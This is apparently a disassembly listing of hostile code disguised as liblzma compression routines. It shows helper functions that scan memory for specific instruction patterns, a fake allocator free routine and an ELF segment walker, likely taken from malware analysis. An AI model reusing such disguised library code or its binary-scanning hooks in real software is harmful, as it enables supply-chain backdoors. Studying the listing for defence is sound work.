.text.lzma_mt_block_siza:0000000000000FE1                 add     rax, [rbx]
.text.lzma_mt_block_siza:0000000000000FE4                 add     rax, [rbx+30h]
.text.lzma_mt_block_siza:0000000000000FE8                 cmp     rax, r13
.text.lzma_mt_block_siza:0000000000000FEB                 jz      short loc_FF2
.text.lzma_mt_block_siza:0000000000000FED
.text.lzma_mt_block_siza:0000000000000FED loc_FED:                                ; CODE XREF: _Llzma_mt_block_size_1+64↑j
.text.lzma_mt_block_siza:0000000000000FED                                         ; _Llzma_mt_block_size_1+6D↑j ...
.text.lzma_mt_block_siza:0000000000000FED                 inc     rbp
.text.lzma_mt_block_siza:0000000000000FF0                 jmp     short loc_F9F
.text.lzma_mt_block_siza:0000000000000FF2 ; ---------------------------------------------------------------------------
.text.lzma_mt_block_siza:0000000000000FF2
.text.lzma_mt_block_siza:0000000000000FF2 loc_FF2:                                ; CODE XREF: _Llzma_mt_block_size_1+8B↑j
.text.lzma_mt_block_siza:0000000000000FF2                                         ; _Llzma_mt_block_size_1+9B↑j
.text.lzma_mt_block_siza:0000000000000FF2                 mov     eax, 1
.text.lzma_mt_block_siza:0000000000000FF7
.text.lzma_mt_block_siza:0000000000000FF7 loc_FF7:                                ; CODE XREF: _Llzma_mt_block_size_1+33↑j
.text.lzma_mt_block_siza:0000000000000FF7                 add     rsp, 68h
.text.lzma_mt_block_siza:0000000000000FFB                 pop     rbx
.text.lzma_mt_block_siza:0000000000000FFC                 pop     rbp
.text.lzma_mt_block_siza:0000000000000FFD                 pop     r12
.text.lzma_mt_block_siza:0000000000000FFF                 pop     r13
.text.lzma_mt_block_siza:0000000000001001                 retn
.text.lzma_mt_block_siza:0000000000001001 _Llzma_mt_block_size_1 endp
.text.lzma_mt_block_siza:0000000000001001
.text.lzma_mt_block_siza:0000000000001001 _text_lzma_mt_block_siza ends
.text.lzma_mt_block_siza:0000000000001001
.text.stream_encoda:0000000000001010 ; ===========================================================================
.text.stream_encoda:0000000000001010
.text.stream_encoda:0000000000001010 ; Segment type: Pure code
.text.stream_encoda:0000000000001010 ; Segment permissions: Read/Execute
.text.stream_encoda:0000000000001010 _text_stream_encoda segment para public 'CODE' use64
.text.stream_encoda:0000000000001010                 assume cs:_text_stream_encoda
.text.stream_encoda:0000000000001010                 ;org 1010h
.text.stream_encoda:0000000000001010                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_encoda:0000000000001010
.text.stream_encoda:0000000000001010 ; =============== S U B R O U T I N E =======================================
.text.stream_encoda:0000000000001010
.text.stream_encoda:0000000000001010
.text.stream_encoda:0000000000001010 ; __int64 __fastcall Lstream_encode_1(unsigned __int64, unsigned __int64, __int64)
.text.stream_encoda:0000000000001010 _Lstream_encode_1 proc near             ; CODE XREF: sub_2D20+C9↓p
.text.stream_encoda:0000000000001010                                         ; _Llzma_auto_decode_1+5B↓p ...
.text.stream_encoda:0000000000001010
.text.stream_encoda:0000000000001010 var_60          = qword ptr -60h
.text.stream_encoda:0000000000001010
.text.stream_encoda:0000000000001010                 endbr64
.text.stream_encoda:0000000000001014                 sub     rsp, 68h
.text.stream_encoda:0000000000001018                 mov     r8, rdi
.text.stream_encoda:000000000000101B                 xor     eax, eax
.text.stream_encoda:000000000000101D                 mov     ecx, 16h
.text.stream_encoda:0000000000001022                 lea     rdi, [rsp+68h+var_60]
.text.stream_encoda:0000000000001027                 rep stosd
.text.stream_encoda:0000000000001029                 lea     rax, [rsp+68h+var_60]
.text.stream_encoda:000000000000102E                 mov     rcx, rdx
.text.stream_encoda:0000000000001031                 mov     rdi, r8
.text.stream_encoda:0000000000001034                 mov     rdx, rax
.text.stream_encoda:0000000000001037                 call    _Llzma_mt_block_size_1 ; PIC mode
.text.stream_encoda:000000000000103C                 mov     edx, eax
.text.stream_encoda:000000000000103E                 xor     eax, eax
.text.stream_encoda:0000000000001040                 test    edx, edx
.text.stream_encoda:0000000000001042                 jz      short loc_1049
.text.stream_encoda:0000000000001044                 mov     rax, [rsp+68h+var_60]
.text.stream_encoda:0000000000001049
.text.stream_encoda:0000000000001049 loc_1049:                               ; CODE XREF: _Lstream_encode_1+32↑j
.text.stream_encoda:0000000000001049                 add     rsp, 68h
.text.stream_encoda:000000000000104D                 retn
.text.stream_encoda:000000000000104D _Lstream_encode_1 endp
.text.stream_encoda:000000000000104D
.text.stream_encoda:000000000000104D _text_stream_encoda ends
.text.stream_encoda:000000000000104D
.text.lzma_properties_siza:0000000000001050 ; ===========================================================================
.text.lzma_properties_siza:0000000000001050
.text.lzma_properties_siza:0000000000001050 ; Segment type: Pure code
.text.lzma_properties_siza:0000000000001050 ; Segment permissions: Read/Execute
.text.lzma_properties_siza:0000000000001050 _text_lzma_properties_siza segment para public 'CODE' use64
.text.lzma_properties_siza:0000000000001050                 assume cs:_text_lzma_properties_siza
.text.lzma_properties_siza:0000000000001050                 ;org 1050h
.text.lzma_properties_siza:0000000000001050                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_properties_siza:0000000000001050
.text.lzma_properties_siza:0000000000001050 ; =============== S U B R O U T I N E =======================================
.text.lzma_properties_siza:0000000000001050
.text.lzma_properties_siza:0000000000001050
.text.lzma_properties_siza:0000000000001050 ; __int64 __fastcall Llzma_properties_size_0(unsigned __int64, unsigned __int64, char *, int, __int64)
.text.lzma_properties_siza:0000000000001050 _Llzma_properties_size_0 proc near      ; CODE XREF: _Lstream_encoder_mt_init_1+40↓j
.text.lzma_properties_siza:0000000000001050                                         ; sub_2B00+10A↓p ...
.text.lzma_properties_siza:0000000000001050
.text.lzma_properties_siza:0000000000001050 var_80          = byte ptr -80h
.text.lzma_properties_siza:0000000000001050
.text.lzma_properties_siza:0000000000001050                 endbr64
.text.lzma_properties_siza:0000000000001054                 push    r14
.text.lzma_properties_siza:0000000000001056                 mov     r14d, ecx
.text.lzma_properties_siza:0000000000001059                 xor     ecx, ecx
.text.lzma_properties_siza:000000000000105B                 push    r13
.text.lzma_properties_siza:000000000000105D                 mov     r13, r8
.text.lzma_properties_siza:0000000000001060                 push    r12
.text.lzma_properties_siza:0000000000001062                 mov     r12, rsi
.text.lzma_properties_siza:0000000000001065                 mov     esi, 4
.text.lzma_properties_siza:000000000000106A                 push    rbp
.text.lzma_properties_siza:000000000000106B                 mov     rbp, rdi
.text.lzma_properties_siza:000000000000106E                 mov     edi, 0D6h
.text.lzma_properties_siza:0000000000001073                 push    rbx
.text.lzma_properties_siza:0000000000001074                 mov     rbx, rdx
.text.lzma_properties_siza:0000000000001077                 mov     edx, 0Eh
.text.lzma_properties_siza:000000000000107C                 sub     rsp, 60h
.text.lzma_properties_siza:0000000000001080                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_properties_siza:0000000000001085                 test    eax, eax
.text.lzma_properties_siza:0000000000001087                 jnz     short loc_108D
.text.lzma_properties_siza:0000000000001089
.text.lzma_properties_siza:0000000000001089 loc_1089:                               ; CODE XREF: _Llzma_properties_size_0+5A↓j
.text.lzma_properties_siza:0000000000001089                 xor     eax, eax
.text.lzma_properties_siza:000000000000108B                 jmp     short loc_10F8
.text.lzma_properties_siza:000000000000108D ; ---------------------------------------------------------------------------
.text.lzma_properties_siza:000000000000108D
.text.lzma_properties_siza:000000000000108D loc_108D:                               ; CODE XREF: _Llzma_properties_size_0+37↑j
.text.lzma_properties_siza:000000000000108D                 xor     eax, eax
.text.lzma_properties_siza:000000000000108F                 lea     rdi, [rsp+88h+var_80]
.text.lzma_properties_siza:0000000000001094                 mov     ecx, 16h
.text.lzma_properties_siza:0000000000001099                 test    rbx, rbx
.text.lzma_properties_siza:000000000000109C                 rep stosd
.text.lzma_properties_siza:000000000000109E                 lea     rax, [rsp+88h+var_80]
.text.lzma_properties_siza:00000000000010A3                 cmovz   rbx, rax
.text.lzma_properties_siza:00000000000010A7
.text.lzma_properties_siza:00000000000010A7 loc_10A7:                               ; CODE XREF: _Llzma_properties_size_0+A1↓j
.text.lzma_properties_siza:00000000000010A7                 cmp     rbp, r12
.text.lzma_properties_siza:00000000000010AA                 jnb     short loc_1089
.text.lzma_properties_siza:00000000000010AC                 mov     rdx, r12
.text.lzma_properties_siza:00000000000010AF                 mov     rsi, rbp
.text.lzma_properties_siza:00000000000010B2                 mov     rdi, rbx
.text.lzma_properties_siza:00000000000010B5                 call    code_dasm       ; PIC mode
.text.lzma_properties_siza:00000000000010BA                 test    eax, eax
.text.lzma_properties_siza:00000000000010BC                 jz      short loc_10EE
.text.lzma_properties_siza:00000000000010BE                 cmp     [rbx+28h], r14d
.text.lzma_properties_siza:00000000000010C2                 jnz     short loc_10EE
.text.lzma_properties_siza:00000000000010C4                 mov     eax, [rbx+1Ch]
.text.lzma_properties_siza:00000000000010C7                 and     eax, 0FF00FF00h
.text.lzma_properties_siza:00000000000010CC                 cmp     eax, 5000000h
.text.lzma_properties_siza:00000000000010D1                 jnz     short loc_10EE
.text.lzma_properties_siza:00000000000010D3                 test    r13, r13
.text.lzma_properties_siza:00000000000010D6                 jz      short loc_10F3
.text.lzma_properties_siza:00000000000010D8                 test    byte ptr [rbx+11h], 1
.text.lzma_properties_siza:00000000000010DC                 jz      short loc_10EE
.text.lzma_properties_siza:00000000000010DE                 mov     rax, [rbx+30h]
.text.lzma_properties_siza:00000000000010E2                 add     rax, [rbx]
.text.lzma_properties_siza:00000000000010E5                 add     rax, [rbx+8]
.text.lzma_properties_siza:00000000000010E9                 cmp     r13, rax
.text.lzma_properties_siza:00000000000010EC                 jz      short loc_10F3
.text.lzma_properties_siza:00000000000010EE
.text.lzma_properties_siza:00000000000010EE loc_10EE:                               ; CODE XREF: _Llzma_properties_size_0+6C↑j
.text.lzma_properties_siza:00000000000010EE                                         ; _Llzma_properties_size_0+72↑j ...
.text.lzma_properties_siza:00000000000010EE                 inc     rbp
.text.lzma_properties_siza:00000000000010F1                 jmp     short loc_10A7
.text.lzma_properties_siza:00000000000010F3 ; ---------------------------------------------------------------------------
.text.lzma_properties_siza:00000000000010F3
.text.lzma_properties_siza:00000000000010F3 loc_10F3:                               ; CODE XREF: _Llzma_properties_size_0+86↑j
.text.lzma_properties_siza:00000000000010F3                                         ; _Llzma_properties_size_0+9C↑j
.text.lzma_properties_siza:00000000000010F3                 mov     eax, 1
.text.lzma_properties_siza:00000000000010F8
.text.lzma_properties_siza:00000000000010F8 loc_10F8:                               ; CODE XREF: _Llzma_properties_size_0+3B↑j
.text.lzma_properties_siza:00000000000010F8                 add     rsp, 60h
.text.lzma_properties_siza:00000000000010FC                 pop     rbx
.text.lzma_properties_siza:00000000000010FD                 pop     rbp
.text.lzma_properties_siza:00000000000010FE                 pop     r12
.text.lzma_properties_siza:0000000000001100                 pop     r13
.text.lzma_properties_siza:0000000000001102                 pop     r14
.text.lzma_properties_siza:0000000000001104                 retn
.text.lzma_properties_siza:0000000000001104 _Llzma_properties_size_0 endp
.text.lzma_properties_siza:0000000000001104
.text.lzma_properties_siza:0000000000001104 _text_lzma_properties_siza ends
.text.lzma_properties_siza:0000000000001104
.text.stream_encoder_mt_inia:0000000000001110 ; ===========================================================================
.text.stream_encoder_mt_inia:0000000000001110
.text.stream_encoder_mt_inia:0000000000001110 ; Segment type: Pure code
.text.stream_encoder_mt_inia:0000000000001110 ; Segment permissions: Read/Execute
.text.stream_encoder_mt_inia:0000000000001110 _text_stream_encoder_mt_inia segment para public 'CODE' use64
.text.stream_encoder_mt_inia:0000000000001110                 assume cs:_text_stream_encoder_mt_inia
.text.stream_encoder_mt_inia:0000000000001110                 ;org 1110h
.text.stream_encoder_mt_inia:0000000000001110                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_encoder_mt_inia:0000000000001110
.text.stream_encoder_mt_inia:0000000000001110 ; =============== S U B R O U T I N E =======================================
.text.stream_encoder_mt_inia:0000000000001110
.text.stream_encoder_mt_inia:0000000000001110
.text.stream_encoder_mt_inia:0000000000001110 ; __int64 __fastcall Lstream_encoder_mt_init_1(unsigned __int64, unsigned __int64, char *, __int64)
.text.stream_encoder_mt_inia:0000000000001110 _Lstream_encoder_mt_init_1 proc near    ; CODE XREF: _Llzma_check_finish_0+30↓p
.text.stream_encoder_mt_inia:0000000000001110                                         ; _Llzma_check_finish_0+5B↓p ...
.text.stream_encoder_mt_inia:0000000000001110
.text.stream_encoder_mt_inia:0000000000001110 var_28          = qword ptr -28h
.text.stream_encoder_mt_inia:0000000000001110 var_20          = qword ptr -20h
.text.stream_encoder_mt_inia:0000000000001110 var_18          = qword ptr -18h
.text.stream_encoder_mt_inia:0000000000001110 var_10          = qword ptr -10h
.text.stream_encoder_mt_inia:0000000000001110
.text.stream_encoder_mt_inia:0000000000001110                 endbr64
.text.stream_encoder_mt_inia:0000000000001114                 sub     rsp, 28h
.text.stream_encoder_mt_inia:0000000000001118                 mov     [rsp+28h+var_18], rdx
.text.stream_encoder_mt_inia:000000000000111D                 mov     [rsp+28h+var_20], rsi
.text.stream_encoder_mt_inia:0000000000001122                 mov     [rsp+28h+var_28], rdi
.text.stream_encoder_mt_inia:0000000000001126                 mov     [rsp+28h+var_10], rcx
.text.stream_encoder_mt_inia:000000000000112B                 call    _Llzma_mt_block_size_1 ; PIC mode
.text.stream_encoder_mt_inia:0000000000001130                 mov     rdi, [rsp+28h+var_28]
.text.stream_encoder_mt_inia:0000000000001134                 mov     rsi, [rsp+28h+var_20]
.text.stream_encoder_mt_inia:0000000000001139                 test    eax, eax
.text.stream_encoder_mt_inia:000000000000113B                 mov     rdx, [rsp+28h+var_18]
.text.stream_encoder_mt_inia:0000000000001140                 mov     r8, [rsp+28h+var_10]
.text.stream_encoder_mt_inia:0000000000001145                 jnz     short loc_1155
.text.stream_encoder_mt_inia:0000000000001147                 mov     ecx, 10Bh
.text.stream_encoder_mt_inia:000000000000114C                 add     rsp, 28h
.text.stream_encoder_mt_inia:0000000000001150                 jmp     _Llzma_properties_size_0 ; PIC mode
.text.stream_encoder_mt_inia:0000000000001155 ; ---------------------------------------------------------------------------
.text.stream_encoder_mt_inia:0000000000001155
.text.stream_encoder_mt_inia:0000000000001155 loc_1155:                               ; CODE XREF: _Lstream_encoder_mt_init_1+35↑j
.text.stream_encoder_mt_inia:0000000000001155                 mov     eax, 1
.text.stream_encoder_mt_inia:000000000000115A                 add     rsp, 28h
.text.stream_encoder_mt_inia:000000000000115E                 retn
.text.stream_encoder_mt_inia:000000000000115E _Lstream_encoder_mt_init_1 endp
.text.stream_encoder_mt_inia:000000000000115E
.text.stream_encoder_mt_inia:000000000000115E _text_stream_encoder_mt_inia ends
.text.stream_encoder_mt_inia:000000000000115E
.text.lzma_simple_x86_decoder_inif:0000000000001160 ; ===========================================================================
.text.lzma_simple_x86_decoder_inif:0000000000001160
.text.lzma_simple_x86_decoder_inif:0000000000001160 ; Segment type: Pure code
.text.lzma_simple_x86_decoder_inif:0000000000001160 ; Segment permissions: Read/Execute
.text.lzma_simple_x86_decoder_inif:0000000000001160 _text_lzma_simple_x86_decoder_inif segment para public 'CODE' use64
.text.lzma_simple_x86_decoder_inif:0000000000001160                 assume cs:_text_lzma_simple_x86_decoder_inif
.text.lzma_simple_x86_decoder_inif:0000000000001160                 ;org 1160h
.text.lzma_simple_x86_decoder_inif:0000000000001160                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_simple_x86_decoder_inif:0000000000001160
.text.lzma_simple_x86_decoder_inif:0000000000001160 ; =============== S U B R O U T I N E =======================================
.text.lzma_simple_x86_decoder_inif:0000000000001160
.text.lzma_simple_x86_decoder_inif:0000000000001160
.text.lzma_simple_x86_decoder_inif:0000000000001160 ; __int64 __fastcall Llzma_simple_x86_decoder_init_1(unsigned __int64, unsigned __int64, char *, __int64)
.text.lzma_simple_x86_decoder_inif:0000000000001160 _Llzma_simple_x86_decoder_init_1 proc near
.text.lzma_simple_x86_decoder_inif:0000000000001160                                         ; CODE XREF: parse_elf_init+D6F↓p
.text.lzma_simple_x86_decoder_inif:0000000000001160
.text.lzma_simple_x86_decoder_inif:0000000000001160 var_80          = byte ptr -80h
.text.lzma_simple_x86_decoder_inif:0000000000001160
.text.lzma_simple_x86_decoder_inif:0000000000001160                 endbr64
.text.lzma_simple_x86_decoder_inif:0000000000001164                 push    r13
.text.lzma_simple_x86_decoder_inif:0000000000001166                 xor     eax, eax
.text.lzma_simple_x86_decoder_inif:0000000000001168                 mov     r13, rcx
.text.lzma_simple_x86_decoder_inif:000000000000116B                 mov     ecx, 16h
.text.lzma_simple_x86_decoder_inif:0000000000001170                 push    r12
.text.lzma_simple_x86_decoder_inif:0000000000001172                 mov     r12, rsi
.text.lzma_simple_x86_decoder_inif:0000000000001175                 push    rbp
.text.lzma_simple_x86_decoder_inif:0000000000001176                 mov     rbp, rdi
.text.lzma_simple_x86_decoder_inif:0000000000001179                 push    rbx
.text.lzma_simple_x86_decoder_inif:000000000000117A                 mov     rbx, rdx
.text.lzma_simple_x86_decoder_inif:000000000000117D                 sub     rsp, 68h
.text.lzma_simple_x86_decoder_inif:0000000000001181                 test    rdx, rdx
.text.lzma_simple_x86_decoder_inif:0000000000001184                 lea     rdi, [rsp+88h+var_80]
.text.lzma_simple_x86_decoder_inif:0000000000001189                 rep stosd
.text.lzma_simple_x86_decoder_inif:000000000000118B                 lea     rax, [rsp+88h+var_80]
.text.lzma_simple_x86_decoder_inif:0000000000001190                 cmovz   rbx, rax
.text.lzma_simple_x86_decoder_inif:0000000000001194
.text.lzma_simple_x86_decoder_inif:0000000000001194 loc_1194:                               ; CODE XREF: _Llzma_simple_x86_decoder_init_1+81↓j
.text.lzma_simple_x86_decoder_inif:0000000000001194                 cmp     rbp, r12
.text.lzma_simple_x86_decoder_inif:0000000000001197                 jnb     short loc_11E3
.text.lzma_simple_x86_decoder_inif:0000000000001199                 mov     rdx, r12
.text.lzma_simple_x86_decoder_inif:000000000000119C                 mov     rsi, rbp
.text.lzma_simple_x86_decoder_inif:000000000000119F                 mov     rdi, rbx
.text.lzma_simple_x86_decoder_inif:00000000000011A2                 call    code_dasm       ; PIC mode
.text.lzma_simple_x86_decoder_inif:00000000000011A7                 test    eax, eax
.text.lzma_simple_x86_decoder_inif:00000000000011A9                 jz      short loc_11DE
.text.lzma_simple_x86_decoder_inif:00000000000011AB                 cmp     dword ptr [rbx+28h], 103h
.text.lzma_simple_x86_decoder_inif:00000000000011B2                 jnz     short loc_11DE
.text.lzma_simple_x86_decoder_inif:00000000000011B4                 mov     eax, [rbx+1Ch]
.text.lzma_simple_x86_decoder_inif:00000000000011B7                 and     eax, 0FF00FF00h
.text.lzma_simple_x86_decoder_inif:00000000000011BC                 cmp     eax, 5000000h
.text.lzma_simple_x86_decoder_inif:00000000000011C1                 jnz     short loc_11DE
.text.lzma_simple_x86_decoder_inif:00000000000011C3                 test    r13, r13
.text.lzma_simple_x86_decoder_inif:00000000000011C6                 jz      short loc_11E7
.text.lzma_simple_x86_decoder_inif:00000000000011C8                 test    byte ptr [rbx+11h], 1
.text.lzma_simple_x86_decoder_inif:00000000000011CC                 jz      short loc_11DE
.text.lzma_simple_x86_decoder_inif:00000000000011CE                 mov     rax, [rbx+30h]
.text.lzma_simple_x86_decoder_inif:00000000000011D2                 add     rax, [rbx]
.text.lzma_simple_x86_decoder_inif:00000000000011D5                 add     rax, [rbx+8]
.text.lzma_simple_x86_decoder_inif:00000000000011D9                 cmp     r13, rax
.text.lzma_simple_x86_decoder_inif:00000000000011DC                 jz      short loc_11E7
.text.lzma_simple_x86_decoder_inif:00000000000011DE
.text.lzma_simple_x86_decoder_inif:00000000000011DE loc_11DE:                               ; CODE XREF: _Llzma_simple_x86_decoder_init_1+49↑j
.text.lzma_simple_x86_decoder_inif:00000000000011DE                                         ; _Llzma_simple_x86_decoder_init_1+52↑j ...
.text.lzma_simple_x86_decoder_inif:00000000000011DE                 inc     rbp
.text.lzma_simple_x86_decoder_inif:00000000000011E1                 jmp     short loc_1194
.text.lzma_simple_x86_decoder_inif:00000000000011E3 ; ---------------------------------------------------------------------------
.text.lzma_simple_x86_decoder_inif:00000000000011E3
.text.lzma_simple_x86_decoder_inif:00000000000011E3 loc_11E3:                               ; CODE XREF: _Llzma_simple_x86_decoder_init_1+37↑j
.text.lzma_simple_x86_decoder_inif:00000000000011E3                 xor     eax, eax
.text.lzma_simple_x86_decoder_inif:00000000000011E5                 jmp     short loc_11EC
.text.lzma_simple_x86_decoder_inif:00000000000011E7 ; ---------------------------------------------------------------------------
.text.lzma_simple_x86_decoder_inif:00000000000011E7
.text.lzma_simple_x86_decoder_inif:00000000000011E7 loc_11E7:                               ; CODE XREF: _Llzma_simple_x86_decoder_init_1+66↑j
.text.lzma_simple_x86_decoder_inif:00000000000011E7                                         ; _Llzma_simple_x86_decoder_init_1+7C↑j
.text.lzma_simple_x86_decoder_inif:00000000000011E7                 mov     eax, 1
.text.lzma_simple_x86_decoder_inif:00000000000011EC
.text.lzma_simple_x86_decoder_inif:00000000000011EC loc_11EC:                               ; CODE XREF: _Llzma_simple_x86_decoder_init_1+85↑j
.text.lzma_simple_x86_decoder_inif:00000000000011EC                 add     rsp, 68h
.text.lzma_simple_x86_decoder_inif:00000000000011F0                 pop     rbx
.text.lzma_simple_x86_decoder_inif:00000000000011F1                 pop     rbp
.text.lzma_simple_x86_decoder_inif:00000000000011F2                 pop     r12
.text.lzma_simple_x86_decoder_inif:00000000000011F4                 pop     r13
.text.lzma_simple_x86_decoder_inif:00000000000011F6                 retn
.text.lzma_simple_x86_decoder_inif:00000000000011F6 _Llzma_simple_x86_decoder_init_1 endp
.text.lzma_simple_x86_decoder_inif:00000000000011F6
.text.lzma_simple_x86_decoder_inif:00000000000011F6 _text_lzma_simple_x86_decoder_inif ends
.text.lzma_simple_x86_decoder_inif:00000000000011F6
.text.stream_decoda:0000000000001200 ; ===========================================================================
.text.stream_decoda:0000000000001200
.text.stream_decoda:0000000000001200 ; Segment type: Pure code
.text.stream_decoda:0000000000001200 ; Segment permissions: Read/Execute
.text.stream_decoda:0000000000001200 _text_stream_decoda segment para public 'CODE' use64
.text.stream_decoda:0000000000001200                 assume cs:_text_stream_decoda
.text.stream_decoda:0000000000001200                 ;org 1200h
.text.stream_decoda:0000000000001200                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_decoda:0000000000001200
.text.stream_decoda:0000000000001200 ; =============== S U B R O U T I N E =======================================
.text.stream_decoda:0000000000001200
.text.stream_decoda:0000000000001200 ; Attributes: bp-based frame
.text.stream_decoda:0000000000001200
.text.stream_decoda:0000000000001200 ; void fake_lzma_free()
.text.stream_decoda:0000000000001200 fake_lzma_free  proc near               ; DATA XREF: .data.rel.ro.decoders0:data_lzma_allocator↓o
.text.stream_decoda:0000000000001200
.text.stream_decoda:0000000000001200 var_10          = qword ptr -10h
.text.stream_decoda:0000000000001200 var_8           = qword ptr -8
.text.stream_decoda:0000000000001200
.text.stream_decoda:0000000000001200                 endbr64
.text.stream_decoda:0000000000001204                 push    rbp
.text.stream_decoda:0000000000001205                 mov     rbp, rsp
.text.stream_decoda:0000000000001208                 mov     [rbp+var_8], rdi
.text.stream_decoda:000000000000120C                 mov     [rbp+var_10], rsi
.text.stream_decoda:0000000000001210                 cmp     [rbp+var_10], 0
.text.stream_decoda:0000000000001215                 jz      short loc_1221
.text.stream_decoda:0000000000001217                 mov     [rbp+var_10], 0
.text.stream_decoda:000000000000121F                 jmp     short loc_1229
.text.stream_decoda:0000000000001221 ; ---------------------------------------------------------------------------
.text.stream_decoda:0000000000001221
.text.stream_decoda:0000000000001221 loc_1221:                               ; CODE XREF: fake_lzma_free+15↑j
.text.stream_decoda:0000000000001221                 mov     [rbp+var_10], 0
.text.stream_decoda:0000000000001229
.text.stream_decoda:0000000000001229 loc_1229:                               ; CODE XREF: fake_lzma_free+1F↑j
.text.stream_decoda:0000000000001229                 nop
.text.stream_decoda:000000000000122A                 pop     rbp
.text.stream_decoda:000000000000122B                 retn
.text.stream_decoda:000000000000122B fake_lzma_free  endp
.text.stream_decoda:000000000000122B
.text.stream_decoda:000000000000122B _text_stream_decoda ends
.text.stream_decoda:000000000000122B
.text.powerpc_coda:0000000000001230 ; ===========================================================================
.text.powerpc_coda:0000000000001230
.text.powerpc_coda:0000000000001230 ; Segment type: Pure code
.text.powerpc_coda:0000000000001230 ; Segment permissions: Read/Execute
.text.powerpc_coda:0000000000001230 _text_powerpc_coda segment para public 'CODE' use64
.text.powerpc_coda:0000000000001230                 assume cs:_text_powerpc_coda
.text.powerpc_coda:0000000000001230                 ;org 1230h
.text.powerpc_coda:0000000000001230                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.powerpc_coda:0000000000001230
.text.powerpc_coda:0000000000001230 ; =============== S U B R O U T I N E =======================================
.text.powerpc_coda:0000000000001230
.text.powerpc_coda:0000000000001230
.text.powerpc_coda:0000000000001230 ; __int64 __fastcall process_elf_seg_next(struct_elf_info *elf_info, unsigned __int64 a2, unsigned __int64 a3, unsigned int ptflags, __int64 a5)
.text.powerpc_coda:0000000000001230                 public process_elf_seg_next
.text.powerpc_coda:0000000000001230 process_elf_seg_next proc near          ; CODE XREF: process_elf_seg_next+113↓p
.text.powerpc_coda:0000000000001230                                         ; process_elf_seg_next+133↓p ...
.text.powerpc_coda:0000000000001230
.text.powerpc_coda:0000000000001230 var_2C          = dword ptr -2Ch
.text.powerpc_coda:0000000000001230
.text.powerpc_coda:0000000000001230                 push    r14
.text.powerpc_coda:0000000000001232                 mov     r14d, ecx
.text.powerpc_coda:0000000000001235                 push    r13
.text.powerpc_coda:0000000000001237                 mov     r13, rdi
.text.powerpc_coda:000000000000123A                 push    r12
.text.powerpc_coda:000000000000123C                 push    rbx
.text.powerpc_coda:000000000000123D                 sub     rsp, 18h
.text.powerpc_coda:0000000000001241                 mov     rcx, [rdi]
.text.powerpc_coda:0000000000001244
.text.powerpc_coda:0000000000001244 loc_1244:                               ; CODE XREF: process_elf_seg_next+D9↓j
.text.powerpc_coda:0000000000001244                                         ; process_elf_seg_next+F7↓j
.text.powerpc_coda:0000000000001244                 inc     r8d
.text.powerpc_coda:0000000000001247                 lea     r12, [rsi+rdx]
.text.powerpc_coda:000000000000124B                 test    rdx, rdx
.text.powerpc_coda:000000000000124E                 jz      loc_137E
.text.powerpc_coda:0000000000001254                 cmp     rsi, r12
.text.powerpc_coda:0000000000001257                 mov     rax, r12
.text.powerpc_coda:000000000000125A                 cmovbe  rax, rsi
.text.powerpc_coda:000000000000125E                 cmp     rax, rcx
.text.powerpc_coda:0000000000001261                 jb      loc_137A
.text.powerpc_coda:0000000000001267                 cmp     r8d, 3EAh
.text.powerpc_coda:000000000000126E                 jz      loc_137A
.text.powerpc_coda:0000000000001274                 movzx   r9d, word ptr [r13+18h]
.text.powerpc_coda:0000000000001279                 xor     edi, edi
.text.powerpc_coda:000000000000127B
.text.powerpc_coda:000000000000127B loc_127B:                               ; CODE XREF: process_elf_seg_next+145↓j
.text.powerpc_coda:000000000000127B                 cmp     edi, r9d
.text.powerpc_coda:000000000000127E                 jnb     loc_137A
.text.powerpc_coda:0000000000001284                 imul    rax, rdi, 38h ; '8'
.text.powerpc_coda:0000000000001288                 add     rax, [r13+10h]
.text.powerpc_coda:000000000000128C                 cmp     dword ptr [rax], 1
.text.powerpc_coda:000000000000128F                 jnz     loc_1372
.text.powerpc_coda:0000000000001295                 mov     edx, [rax+4]
.text.powerpc_coda:0000000000001298                 and     edx, r14d
.text.powerpc_coda:000000000000129B                 cmp     edx, r14d
.text.powerpc_coda:000000000000129E                 jnz     loc_1372
.text.powerpc_coda:00000000000012A4                 mov     rbx, [rax+28h]
.text.powerpc_coda:00000000000012A8                 mov     rdx, rcx
.text.powerpc_coda:00000000000012AB                 sub     rdx, [r13+8]
.text.powerpc_coda:00000000000012AF                 add     rdx, [rax+10h]
.text.powerpc_coda:00000000000012B3                 add     rbx, rdx
.text.powerpc_coda:00000000000012B6                 and     rdx, 0FFFFFFFFFFFFF000h
.text.powerpc_coda:00000000000012BD                 test    ebx, 0FFFh
.text.powerpc_coda:00000000000012C3                 jz      short loc_12D3
.text.powerpc_coda:00000000000012C5                 and     rbx, 0FFFFFFFFFFFFF000h
.text.powerpc_coda:00000000000012CC                 add     rbx, 1000h
.text.powerpc_coda:00000000000012D3
.text.powerpc_coda:00000000000012D3 loc_12D3:                               ; CODE XREF: process_elf_seg_next+93↑j
.text.powerpc_coda:00000000000012D3                 cmp     rsi, rdx
.text.powerpc_coda:00000000000012D6                 setnb   r10b
.text.powerpc_coda:00000000000012DA                 cmp     rbx, r12
.text.powerpc_coda:00000000000012DD                 setnb   r11b
.text.powerpc_coda:00000000000012E1                 test    r10b, r10b
.text.powerpc_coda:00000000000012E4                 jz      short loc_12EF
.text.powerpc_coda:00000000000012E6                 test    r11b, r11b
.text.powerpc_coda:00000000000012E9                 jnz     loc_137E
.text.powerpc_coda:00000000000012EF
.text.powerpc_coda:00000000000012EF loc_12EF:                               ; CODE XREF: process_elf_seg_next+B4↑j
.text.powerpc_coda:00000000000012EF                 cmp     rsi, rdx
.text.powerpc_coda:00000000000012F2                 setb    al
.text.powerpc_coda:00000000000012F5                 test    r11b, r11b
.text.powerpc_coda:00000000000012F8                 jz      short loc_130E
.text.powerpc_coda:00000000000012FA                 test    al, al
.text.powerpc_coda:00000000000012FC                 jz      short loc_130E
.text.powerpc_coda:00000000000012FE                 cmp     rdx, r12
.text.powerpc_coda:0000000000001301                 jnb     short loc_1372
.text.powerpc_coda:0000000000001303                 sub     rdx, rsi
.text.powerpc_coda:0000000000001306                 dec     rdx
.text.powerpc_coda:0000000000001309                 jmp     loc_1244
